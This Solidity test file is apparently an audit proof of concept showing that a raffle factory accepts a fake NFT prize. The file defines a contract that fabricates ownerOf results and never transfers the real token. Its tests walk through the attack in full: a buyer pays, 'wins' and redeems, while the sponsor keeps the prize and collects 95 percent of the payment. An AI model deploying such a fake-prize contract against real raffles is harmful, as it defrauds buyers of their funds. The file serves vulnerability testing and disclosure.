// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { RaffleFactory } from "../../src/RaffleFactory.sol";
import { IRaffle } from "../../src/interfaces/IRaffle.sol";
import { IRaffleFactory } from "../../src/interfaces/IRaffleFactory.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SixDecimalToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function decimals() external pure returns (uint8) {
        return 6;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DummyWrapper {
    uint256 public nextRequestId;

    function link() external pure returns (address) {
        return address(1);
    }

    function calculateRequestPriceNative(uint32, uint32) external pure returns (uint256) {
        return 0;
    }

    function estimateRequestPriceNative(uint32, uint32, uint256) external pure returns (uint256) {
        return 0;
    }

    function requestRandomWordsInNative(uint32, uint16, uint32, bytes calldata)
        external
        payable
        returns (uint256 requestId)
    {
        requestId = ++nextRequestId;
    }

    function fulfill(address raffle, uint256 requestId, uint256 word) external {
        uint256[] memory words = new uint256[](1);
        words[0] = word;
        (bool success,) = raffle.call(abi.encodeWithSignature("rawFulfillRandomWords(uint256,uint256[])", requestId, words));
        require(success, "callback failed");
    }
}

/// @dev This contract claims ERC-721 support and fabricates owner reports without moving a token.
contract UntrustedPrize {
    mapping(uint256 => address) public actualOwner;
    mapping(uint256 => address) public reportedOwner;

    constructor(address sponsor) {
        actualOwner[1] = sponsor;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == type(IERC721).interfaceId;
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        reportedOwner[tokenId] = to;
        IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, "");
        // Deliberately do not change actualOwner[tokenId].
    }

    function transferFrom(address, address to, uint256 tokenId) external {
        reportedOwner[tokenId] = to;
        // Deliberately do not change actualOwner[tokenId].
    }

    function ownerOf(uint256 tokenId) external view returns (address) {
        return reportedOwner[tokenId];
    }

    function seize(uint256 tokenId, address nextReportedOwner) external {
        reportedOwner[tokenId] = nextReportedOwner;
    }
}

contract SponsorActor {
    function create(RaffleFactory factory, UntrustedPrize prize, uint64 endTime) external returns (address raffle) {
        raffle = factory.createRaffle(
            IRaffleFactory.CreateRaffleParams({
                sponsorRecipient: address(this),
                prizeToken: address(prize),
                prizeTokenId: 1,
                reserveEntries: 1,
                endTime: endTime
            })
        );
    }
}

contract BuyerActor is IERC721Receiver {
    function buy(SixDecimalToken quote, address raffle) external {
        quote.approve(raffle, 1_000_000);
        IRaffle(raffle).buyEntries(address(this), 1);
    }

    function redeem(address raffle) external {
        IRaffle(raffle).redeemWinningTicket(1);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}

interface Vm {
    function warp(uint256 timestamp) external;
}

contract UntrustedPrizeProof {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function testFactoryActivatesWithoutPrizeOwnershipMutation() external {
        SixDecimalToken quote = new SixDecimalToken();
        DummyWrapper wrapper = new DummyWrapper();
        RaffleFactory factory = new RaffleFactory(address(quote), address(wrapper), address(0xBEEF));
        UntrustedPrize prize = new UntrustedPrize(address(this));

        address raffle = factory.createRaffle(
            IRaffleFactory.CreateRaffleParams({
                sponsorRecipient: address(0xCAFE),
                prizeToken: address(prize),
                prizeTokenId: 1,
                reserveEntries: 1,
                endTime: uint64(block.timestamp + 1 hours)
            })
        );

        require(factory.isRaffle(raffle), "clone is not registered");
        require(IRaffle(raffle).status() == IRaffle.Status.Active, "raffle is not active");
        require(prize.actualOwner(1) == address(this), "the fake token changed its real ledger");
        require(prize.ownerOf(1) == raffle, "the fake token did not pass ownerOf check");

        prize.seize(1, address(this));
        require(prize.ownerOf(1) == address(this), "the sponsor cannot rewrite ownership");
    }

    function testFakePrizeTakesBuyerPaymentThroughFullRafflePath() external {
        SixDecimalToken quote = new SixDecimalToken();
        DummyWrapper wrapper = new DummyWrapper();
        RaffleFactory factory = new RaffleFactory(address(quote), address(wrapper), address(0xBEEF));
        SponsorActor sponsor = new SponsorActor();
        BuyerActor buyer = new BuyerActor();
        UntrustedPrize prize = new UntrustedPrize(address(sponsor));

        uint64 endTime = uint64(block.timestamp + 100);
        address raffle = sponsor.create(factory, prize, endTime);
        quote.mint(address(buyer), 1_000_000);
        buyer.buy(quote, raffle);

        vm.warp(endTime);
        uint256 requestId = IRaffle(raffle).requestDraw();
        wrapper.fulfill(raffle, requestId, 0);
        require(IRaffle(raffle).status() == IRaffle.Status.NftWon, "reserve outcome was not selected");

        IRaffle(raffle).settleWinningTicket(1);
        buyer.redeem(raffle);
        IRaffle(raffle).releaseSponsorProceeds();

        require(quote.balanceOf(address(buyer)) == 0, "buyer kept the payment");
        require(quote.balanceOf(address(sponsor)) == 950_000, "sponsor did not receive 95 percent");
        require(prize.actualOwner(1) == address(sponsor), "the prize left the sponsor ledger");
        require(prize.ownerOf(1) == address(buyer), "the fabricated delivery check did not pass");
    }
}
